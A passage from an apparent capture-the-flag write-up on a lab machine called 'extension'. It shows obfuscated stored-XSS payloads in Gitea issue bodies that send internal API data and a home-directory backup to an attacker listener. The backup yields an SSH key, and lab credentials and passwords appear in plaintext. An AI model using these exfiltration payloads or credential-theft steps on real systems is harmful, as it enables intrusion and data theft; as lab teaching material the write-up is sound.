font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"e"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">onerror</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>eval.call<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEwLycrYnRvYShkYXRhKSkpCg==`\x29"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb16-8"></span>
<span id="cb16-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## HTTP Server</span></span>
<span id="cb16-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [09/Sep/2022 15:28:29] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo= HTTP/1.1"</span> 404 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb16-11"></span>
<span id="cb16-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo="</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span></span>
<span id="cb16-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Charlie</span> Rooper</span>
<span id="cb16-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Jean</span> Castux</span>
<span id="cb16-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Thierry</span> Halliday</span></code></pre></div>
<p>We got a solid XSS PoC where we’re able to exfiltrate data now we need to find a way to exploit this. Looking through the Gitea <a href="http://dev.snippet.htb/api/swagger/">API docs</a> we have a lot of options, the first that comes to mind is <em>“GET /user”</em> to show the authenticated user - in theory this should confirm what user is performing the XSS actions. To get a better understanding of the user performing my XSS calls lets see if we can extract any repo information using <code>http://dev.snippet.htb/api/v1/repos/search</code>.</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Issues body</span></span>
<span id="cb17-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>remove-me<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>img <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">sRc</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"e"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">onerror</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>eval.call<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL3NlYXJjaCcpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-3"></span>
<span id="cb17-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## HTTP Server</span></span>
<span id="cb17-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [10/Sep/2022 10:05:49] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /eyJvayI6 [... snip ...]</span></span>
<span id="cb17-6"></span>
<span id="cb17-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension echo "</span>eyJvayI6 [... snip ...]<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" | base64 -d &gt; tmp_repos.txt</span></span>
<span id="cb17-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension python3 -m json.tool tmp_repos.txt &gt; xss_repos.json</span></span>
<span id="cb17-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension cat xss_repos.json </span></span>
<span id="cb17-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb17-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>ok<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": true,</span></span>
<span id="cb17-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>data<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": [</span></span>
<span id="cb17-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        {</span></span>
<span id="cb17-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>id<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": 2,</span></span>
<span id="cb17-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>owner<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": {</span></span>
<span id="cb17-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">                [... snip ...]</span></span>
<span id="cb17-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">                "</span>username<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>charlie<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span></span>
<span id="cb17-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            },</span></span>
<span id="cb17-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>name<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>backups<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>full_name<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>charlie/backups<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-21"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>description<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>Backup of my home directory<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            [... snip ...]</span></span>
<span id="cb17-23"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>html_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/charlie/backups<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-24"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>ssh_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>git@localhost:charlie/backups.git<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-25"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>clone_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/charlie/backups.git<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            [... snip ...]</span></span>
<span id="cb17-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>default_branch<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>master<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb17-28"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            [... snip ...]</span></span>
<span id="cb17-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>permissions<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": {</span></span>
<span id="cb17-30"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">                "</span>admin<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": true,</span></span>
<span id="cb17-31"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">                "</span>push<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": true,</span></span>
<span id="cb17-32"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">                "</span>pull<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": true</span></span>
<span id="cb17-33"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            [... snip ...]</span></span></code></pre></div>
<p>This seems very promising, <code>charlie</code> have a repo of his home directory and within we’ll hopefully find his <code>id_rsa</code>. Lets try to expand the XSS further to <code>fetch(http://dev.snippet.htb/charlie/backups)</code>. Trying this for a few times and we get no callbacks, maybe the response is to big resulting in an error and hence no callbacks. Lets try to go right for the money instead, we can assume that <code>id_rsa</code> should be at <code>http://dev.snippet.htb/charlie/backups/raw/branch/master/.ssh/id_rsa</code>.</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [10/Sep/2022 10:27:30] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /Tm90IGZvdW5kLgo= HTTP/1.1"</span> 404 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb18-2"></span>
<span id="cb18-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Tm90IGZvdW5kLgo="</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">base64</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span></span>
<span id="cb18-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> found.</span></code></pre></div>
<p>It is not.. nor is it directly at <code>http://dev.snippet.htb/charlie/backups/raw/branch/master/id_rsa</code>.. Instead of guessing blindly we can do a GET request to list the contents of the <em>backups</em> repo:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Issues body</span></span>
<span id="cb19-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>remove-me<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>img <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">sRc</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"e"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">onerror</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>eval.call<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb19-3"></span>
<span id="cb19-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## HTTP Server</span></span>
<span id="cb19-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [10/Sep/2022 11:28:09] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /W3sibmFtZSI6 [... snip ...]</span></span>
<span id="cb19-6"></span>
<span id="cb19-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension echo "</span>W3sibmFtZSI6 [... snip ...]<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" | base64 -d &gt; tmp_backups-content.txt</span></span>
<span id="cb19-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension python3 -m json.tool tmp_backups-content.txt &gt; xss_repo-backups-content.json</span></span>
<span id="cb19-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension cat xss_repo-backups-content.json</span></span>
<span id="cb19-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[</span></span>
<span id="cb19-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    {</span></span>
<span id="cb19-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>name<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>backup.tar.gz<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>path<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>backup.tar.gz<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>sha<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>type<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>file<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>size<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": 4316,</span></span>
<span id="cb19-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>encoding<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": null,</span></span>
<span id="cb19-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>content<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": null,</span></span>
<span id="cb19-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>target<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": null,</span></span>
<span id="cb19-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>ref=master<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-21"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>html_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>git_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-23"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>download_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-24"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>submodule_git_url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": null,</span></span>
<span id="cb19-25"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        "</span>_links<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": {</span></span>
<span id="cb19-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>self<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span>ref=master<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>git<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb19-28"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">            "</span>html<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span></span>
<span id="cb19-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        }</span></span>
<span id="cb19-30"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    }</span></span>
<span id="cb19-31"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">]</span></span></code></pre></div>
<p>We find a nice <code>download_url</code> go at it one last time and <code>fetch(http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz)</code>. At this point I noticed a problem, the base64 created to download <code>backup.tar.gz</code> contained <code>+</code> signs and all payloads containing <code>+</code> had not worked - neither did this one.. So instead I aimed for <code>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57</code> and thank god no <code>+</code> and we’re able to extract the content.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Issues body</span></span>
<span id="cb20-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>remove-me<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>img <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">sRc</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"e"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">onerror</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>eval.call<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9naXQvYmxvYnMvYzI1Y2I5ZDFmMWQ4M2JkYWQ0MWRhZDQwMzg3NGMyYzliOTFkMGI1NycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb20-3"></span>
<span id="cb20-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## HTTP Server</span></span>
<span id="cb20-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [10/Sep/2022 11:46:20] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /eyJjb250 [... snip ...]</span></span>
<span id="cb20-6"></span>
<span id="cb20-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension echo "</span>eyJjb250 [... snip ...]<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" | base64 -d &gt; tmp_backups.txt</span></span>
<span id="cb20-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension python3 -m json.tool tmp_backups.txt &gt; xss_backups-blob.json</span></span>
<span id="cb20-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension cat xss_backups-blob.json</span></span>
<span id="cb20-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb20-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>content<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>H4sIANO61GEAA [... snip ...]<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb20-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>encoding<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>base64<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb20-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>url<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb20-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>sha<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": "</span>c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">",</span></span>
<span id="cb20-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">    "</span>size<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">": 4316</span></span>
<span id="cb20-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb20-17"></span>
<span id="cb20-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension echo "</span>H4sIANO61GEAA [... snip ...]<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" | base64 -d &gt; backups.tar.gz</span></span>
<span id="cb20-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  extension tar -xvf backups.tar.gz</span></span>
<span id="cb20-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/</span></span>
<span id="cb20-21"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/backups/</span></span>
<span id="cb20-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/backups/backup.tar.gz</span></span>
<span id="cb20-23"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.profile</span></span>
<span id="cb20-24"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.bash_history</span></span>
<span id="cb20-25"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.bash_logout</span></span>
<span id="cb20-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.ssh/</span></span>
<span id="cb20-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.ssh/id_rsa</span></span>
<span id="cb20-28"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.ssh/id_rsa.pub</span></span>
<span id="cb20-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">home/charlie/.bashrc</span></span>
<span id="cb20-30"></span>
<span id="cb20-31"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">➜  .ssh ssh charlie@extension.htb -i id_rsa </span></span>
<span id="cb20-32"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">charlie@extension:~$ id &amp;&amp; hostname</span></span>
<span id="cb20-33"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)</span></span>
<span id="cb20-34"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">extension</span></span>
<span id="cb20-35"></span>
<span id="cb20-36"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">charlie@extension:~$ cat .git-credentials </span></span>
<span id="cb20-37"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">http://charlie:MqiereNBGq4DqSVYaC8nazMXzuYqFJ9WPnIZSIWz@dev.snippet.htb</span></span></code></pre></div>
</section>
<section id="step-5" class="level3">
<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
<p>User <code>charlie</code> doesn’t have access to <code>user.txt</code>, we still need to pivot to <code>jean</code>. We noticed earlier that Jean used the same password for Git and Mail, trying to change user with <code>su jean</code> proves that she yet again use the same password.</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">charlie@extension:~$</span> su jean</span>
<span id="cb21-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span> EHmfar1Y7ppA9O5TAIXnYnJpA</span>
<span id="cb21-3"></span>
<span id="cb21-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:~$</span> id</span>
<span id="cb21-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
